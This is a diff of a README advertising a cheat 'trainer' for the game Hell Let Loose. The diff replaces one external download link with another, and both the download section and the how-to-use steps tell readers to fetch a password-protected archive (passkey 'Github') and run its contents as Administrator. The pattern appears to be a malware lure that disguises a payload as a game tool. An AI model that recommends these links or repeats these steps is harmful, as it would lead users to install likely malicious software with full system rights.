@@ -6,7 +6,7 @@ Hell Let Loose trainer with infinite ammo, no recoil, no spread, infinite stamin
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Based on popular tools like **WeMod**, **MrAntiFun**, and **FLiNG Trainer**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Hell Let Loose.
 4. Run the trainer **as Administrator**.
